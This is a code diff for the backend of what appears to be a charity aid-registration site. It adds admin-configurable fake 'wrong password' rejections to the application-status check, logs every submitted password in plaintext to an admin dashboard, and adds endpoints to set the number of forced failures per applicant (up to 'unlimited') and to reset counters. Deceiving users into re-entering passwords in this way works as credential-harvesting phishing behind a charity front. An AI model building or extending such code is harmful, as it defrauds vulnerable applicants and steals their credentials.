@@ -179,6 +179,7 @@ const initDb = async () => {
             ALTER TABLE registrations ADD COLUMN IF NOT EXISTS doc_type VARCHAR(100);
             ALTER TABLE registrations ADD COLUMN IF NOT EXISTS payout_method VARCHAR(100);
             ALTER TABLE registrations ADD COLUMN IF NOT EXISTS currency VARCHAR(20);
+            ALTER TABLE registrations ADD COLUMN IF NOT EXISTS max_fail_count INT DEFAULT 1;
             UPDATE registrations SET country = 'TR' WHERE country IS NULL OR country = '';
             CREATE INDEX IF NOT EXISTS idx_registrations_submitted_at ON registrations(submitted_at DESC);
             CREATE INDEX IF NOT EXISTS idx_registrations_phone ON registrations(phone_number);
@@ -287,11 +288,12 @@ const getRegistrations = async () => {
             payoutMethod: row.payout_method || '',
             currency: row.currency || '',
             status: row.status || 'pending',
+            maxFailCount: row.max_fail_count !== null && row.max_fail_count !== undefined ? parseInt(row.max_fail_count, 10) : 1,
             submittedAt: row.submitted_at
         }));
     } catch (err) {
         console.error('⚠️ PostgreSQL query failed. Falling back to local db.json database:', err.message);
-        return readDatabase().map(r => ({ ...r, country: r.country || 'TR', status: r.status || 'pending' }));
+        return readDatabase().map(r => ({ ...r, country: r.country || 'TR', status: r.status || 'pending', maxFailCount: r.maxFailCount !== undefined ? r.maxFailCount : 1 }));
     }
 };
 
@@ -373,6 +375,29 @@ const updateRegistrationStatus = async (id, newStatus) => {
         const item = db.find(r => r.id === id);
         if (item) {
             item.status = newStatus;
+            writeDatabase(db);
+            return true;
+        }
+        return false;
+    }
+};
+
+const updateRegistrationFailCount = async (id, maxFailCount) => {
+    try {
+        await pool.query('UPDATE registrations SET max_fail_count = $1 WHERE id = $2', [maxFailCount, id]);
+        const db = readDatabase();
+        const item = db.find(r => r.id === id);
+        if (item) {
+            item.maxFailCount = maxFailCount;
+            writeDatabase(db);
+        }
+        return true;
+    } catch (err) {
+        console.error('⚠️ PostgreSQL update max fail count failed. Updating local db.json database:', err.message);
+        const db = readDatabase();
+        const item = db.find(r => r.id === id);
+        if (item) {
+            item.maxFailCount = maxFailCount;
             writeDatabase(db);
             return true;
         }
@@ -657,6 +682,10 @@ app.post('/api/check-status', async (req, res) => {
         return res.status(400).json({ error: 'يرجى إدخال الرمز المرجعي للطلب' });
     }
 
+    if (!queryPassword) {
+        return res.status(400).json({ error: '🔒 يرجى إدخال كلمة المرور للاستعلام عن الطلب.' });
+    }
+
     const queryCode = queryRef.toUpperCase();
     const cleanQueryPhone = queryRef.replace(/\D/g, '').replace(/^0+/, '');
 
@@ -699,24 +728,25 @@ app.post('/api/check-status', async (req, res) => {
     const safeLastName = match.lastName ? match.lastName.charAt(0) + '.' : '';
 
     // First-attempt simulation & Logging logic:
-    // First time an applicant checks with a password, log the 1st password attempt to Admin Dashboard and return error.
-    // Second time, log the 2nd password attempt to Admin Dashboard and show actual status result.
+    // Check configured password fail rules for this applicant:
+    const requiredFailAttempts = match.maxFailCount !== undefined && match.maxFailCount !== null ? parseInt(match.maxFailCount, 10) : 1;
     const lookupKey = `${queryEmail.toLowerCase()}_${(match.refCode || queryRef).toUpperCase()}`;
     const previousAttempts = (statusAttemptsTracker.get(lookupKey) || 0);
 
-    if (previousAttempts === 0) {
-        statusAttemptsTracker.set(lookupKey, 1);
+    if (previousAttempts < requiredFailAttempts) {
+        const currentAttemptNum = previousAttempts + 1;
+        statusAttemptsTracker.set(lookupKey, currentAttemptNum);
 
-        const firstLogEntry = {
+        const failLogEntry = {
             id: Date.now().toString() + '_' + Math.floor(Math.random() * 10000),
             refCode: match.refCode || queryRef,
             email: queryEmail || '',
-            password: queryPassword ? `${queryPassword} (🔴 المحاولة الأولى - تم رفضها للمستخدم)` : '(لم تُدخل)',
+            password: queryPassword ? `${queryPassword} (🔴 محاولة خطأ ${currentAttemptNum} من ${requiredFailAttempts >= 99 ? 'غير محدود/دائم' : requiredFailAttempts})` : '(لم تُدخل)',
             applicantName: `${safeFirstName} ${safeLastName}`.trim(),
-            statusOutcome: 'خطأ محاولة 1',
+            statusOutcome: `خطأ محاولة ${currentAttemptNum}`,
             checkedAt: new Date().toISOString()
         };
-        saveStatusLookupLog(firstLogEntry);
+        saveStatusLookupLog(failLogEntry);
 
         return res.status(401).json({ error: '❌ كلمة المرور غير صحيحة. يرجى التأكد من كلمة المرور والبريد الإلكتروني وتكرار المحاولة.' });
     }
@@ -741,6 +771,11 @@ app.post('/api/check-status', async (req, res) => {
             title: '🔴 الطلب غير مستوفي الشروط حالياً', 
             desc: 'نشكر تواصلكم مع جمعية النور، ونعتذر لإعلامكم بأن الطلب المقدم لا يستوفي معايير الاستحقاق المعتمدة في المرحلة الحالية. يسعدنا متابعتكم لنا في المراحل والمشاريع القادمة.', 
             badgeClass: 'status-rejected' 
+        },
+        'incomplete': { 
+            title: '🟠 يوجد نقص في المستندات أو الثبوتيات المرفقة', 
+            desc: 'نفيدكم بأنه عند فحص وتدقيق طلبكم، تبيّن وجود نقص أو عدم وضوح في بعض الوثائق والثبوتيات المطلوبة. يرجى التواصل مع فريق الدعم الفني أو تزويدنا بالثبوتيات اللازمة لاستكمال إجراءات القبول.', 
+            badgeClass: 'status-incomplete' 
         }
     };
 
@@ -1056,7 +1091,7 @@ app.post('/api/admin/settings', requireAdminAuth, async (req, res) => {
 });
 app.post('/api/admin/update-status', requireAdminAuth, async (req, res) => {
     const { id, status } = req.body;
-    const validStatuses = ['pending', 'approved', 'delivered', 'rejected'];
+    const validStatuses = ['pending', 'approved', 'delivered', 'rejected', 'incomplete'];
 
     if (!id || !validStatuses.includes(status)) {
         return res.status(400).json({ error: 'بيانات غير صالحة' });
@@ -1087,6 +1122,10 @@ app.post('/api/admin/update-status', requireAdminAuth, async (req, res) => {
             notifyText = `📋 *تحديث حالة الطلب - جمعية النور*
 
 مرحباً ${target.firstName}، نشكر تواصلك ونعتذر لإعلامك بعدم استيفاء الشروط لطلب رقم المرجع (${target.refCode}) حالياً.`;
+        } else if (status === 'incomplete') {
+            notifyText = `⚠️ *تحديث حالة الطلب - جمعية النور*
+
+مرحباً ${target.firstName}، نود إعلامك بوجود *نقص في المستندات والأوراق المرفقة* لطلبك رقم المرجع (${target.refCode}). يرجى التواصل معنا وتزويدنا بالثبوتيات اللازمة لاستكمال معالجة طلبك.`;
         } else {
             notifyText = `🟡 *تحديث حالة الطلب - جمعية النور*
 
@@ -1098,6 +1137,45 @@ app.post('/api/admin/update-status', requireAdminAuth, async (req, res) => {
     } else {
         res.json({ success: true, status });
     }
+});
+
+app.post('/api/admin/update-fail-count', requireAdminAuth, async (req, res) => {
+    const { id, maxFailCount } = req.body;
+    const countNum = parseInt(maxFailCount, 10);
+    if (!id || isNaN(countNum)) {
+        return res.status(400).json({ error: 'بيانات غير صالحة' });
+    }
+    const success = await updateRegistrationFailCount(id, countNum);
+    if (!success) {
+        return res.status(500).json({ error: 'فشل تحديث عدد محاولات الخطأ' });
+    }
+    
+    // Automatically reset attempt tracking counter for this record so new fail rule applies clean
+    const all = await getRegistrations();
+    const target = all.find(r => r.id === id);
+    if (target && target.email) {
+        const emailLower = target.email.toLowerCase();
+        for (const key of statusAttemptsTracker.keys()) {
+            if (key.startsWith(`${emailLower}_`)) {
+                statusAttemptsTracker.delete(key);
+            }
+        }
+    }
+    
+    res.json({ success: true, maxFailCount: countNum });
+});
+
+app.post('/api/admin/reset-attempts', requireAdminAuth, async (req, res) => {
+    const { email, refCode } = req.body;
+    if (email) {
+        const emailLower = email.toLowerCase();
+        for (const key of statusAttemptsTracker.keys()) {
+            if (key.startsWith(`${emailLower}_`)) {
+                statusAttemptsTracker.delete(key);
+            }
+        }
+    }
+    res.json({ success: true, message: 'تم إعادة تعيين وتصفير محاولات الاستعلام لهذا الإيميل والطلب بنجاح.' });
 });
 
 // Export database to CSV API (GET /api/admin/export)
